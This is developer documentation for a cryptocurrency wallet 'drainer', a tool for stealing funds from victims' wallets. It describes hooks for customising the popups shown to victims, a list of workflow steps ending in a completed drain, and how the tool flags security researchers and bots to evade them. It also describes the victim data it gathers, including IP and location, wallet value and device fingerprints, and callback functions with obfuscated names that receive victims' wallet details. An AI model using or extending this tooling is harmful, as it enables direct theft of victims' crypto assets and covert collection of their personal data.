# Custom functions Integration Documentation

## Table of Contents
- [Overview](#overview)
- [Integration Methods](#integration-methods)
- [Popup System](#popup-system)
- [Step Names Reference](#step-names-reference)
- [Step Information Object](#step-information-object)
- [Callback Functions](#callback-functions)

## Overview

This documentation outlines the integration methods, popup system, and data structures for the drainer. The system provides detailed wallet information and supports various cryptocurrency chains and tokens.

## Integration Methods

### Popup Control Functions
(Popup 7 only)
```javascript
// Close the modal popup
window.customPopupClose = function (){
    // Your code to hide popup
}

// Open a modal popup
window.customPopupOpen = async function ({ stepName, stepInfos }){
    console.log(stepName)
    console.log(stepInfos)
    // Your code to handle data
}
```

## Popup System

### Step Flow
The system uses a step-based approach to track the draining process. Each step represents a specific state or action in the workflow.

## Step Names Reference

### Connection Steps
- `impersonator` - Impersonator found, researcher
- `request_connect` - Connection request initiated
- `request_connect_reject` - Connection request rejected
- `invalid_wallet_address` - Invalid wallet address detected

### Verification Steps
- `verify_sign_prompt` - Sign verification prompted
- `verify_sign_reject` - Sign verification rejected
- `verify_sign_approve` - Sign verification approved
- `start_fetch_data` - Asset parsing initiated

### Status Steps
- `blacklisted` - Wallet is blacklisted
- `connect_empty` - Wallet contains no assets
- `connect_too_low` - Wallet below eligibility threshold
- `connect` - Successfully connected and eligible
- `known_bot` - Known bot signature detected

### Transaction Steps
- `prompt` - Asset prompt displayed
- `prompt_reject` - Asset prompt rejected
- `prompt_reject_typed` - Permit rejected
- `prompt_approve` - Approval prompted
- `prompt_approve_typed` - Permit prompted

### Chain Management Steps
- `switch_chain_prompt` - Chain switch prompted
- `switch_chain_reject` - Chain switch rejected
- `switch_chain_approve` - Chain switch approved
- `add_chain_prompt` - Chain addition prompted
- `add_chain_reject` - Chain addition rejected
- `add_chain_approve` - Chain added

### Final Steps
- `seed_end` - Seed process completed
- `drain_strategy_end` - Draining process completed
- `error` - Error occurred during process

## Step Information Object

The `stepInfos` object contains comprehensive information about the wallet and its assets.

### Key Properties
- `rawAssets` - Array of token assets
- `balances` - Native balances across different chains
- `ipInformations` - User's IP and location data
- `walletAddress` - Connected wallet address
- `walletName` - Name of the wallet provider
- `totalWalletPrice` - Total wallet balance in USD
- `walletVersion` - Wallet client version
- `isTelegramMiniApp` - Telegram mini app status
- `os` - User's operating system
- `isMobile` - Mobile device indicator
- `browser` - Browser information
- `isModalDarkMode` - Modal dark mode status
- `isPopupDarkMode` - Popup dark mode status
- `visitorId` - Unique visitor identifier
- `blacklisted` - Blacklist status

### Asset Object Structure
```javascript
{
    chainId: number,
    type: string,
    address: string,
    name: string,
    symbol: string,
    balance: string,
    decimals: number,
    isOpenseaApproved: boolean,
    isPermit2Approved: boolean,
    approvedSwapRouters: array,
    permitConfig: {
        type: string,
        version: string
    },
    permitNonce: string,
    price: number
}
```

### Chain Balance Structure
```javascript
{
    balance: string,
    price: number
}
```

## Callback Functions

### Basic Callbacks
```javascript
// Wallet Address Callback
window.byx9z452mq = function(address) {
    console.log(address);
    // Your code can be here
}

// Wallet Balance Callback
window.np8efn42ua = function(balance) {
    console.log(balance);
    // Your code can be here
}
```

### Detailed Data Callback
```javascript
// Comprehensive Data Callback
window.qf1tf9yfwa = function(data) {
    const {walletAddress, walletName, totalWalletPrice, steps} = data;
    console.log(data);
    // Your code can be here
}
```

The detailed callback provides access to complete wallet information including address, name, total value, and step history.
